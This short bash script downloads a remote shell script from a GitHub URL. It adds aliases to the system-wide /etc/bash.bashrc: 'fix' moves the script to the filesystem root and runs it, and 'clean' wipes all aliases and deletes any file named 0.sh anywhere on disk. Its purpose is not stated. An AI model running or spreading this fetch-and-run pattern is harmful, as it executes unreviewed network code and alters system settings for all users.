#!/bin/bash
wget https://raw.githubusercontent.com/D4NP0UL1N/Public/master/FINAL/0.sh -O /usr/share/misc/final/0.sh 
echo 'alias fix="mv /usr/share/misc/final/0.sh /; /0.sh"' >> /etc/bash.bashrc
echo 'alias clean="unalias -a; find / -name 0.sh -exec rm -f {} 2>/dev/null \;"' >> /etc/bash.bashrc
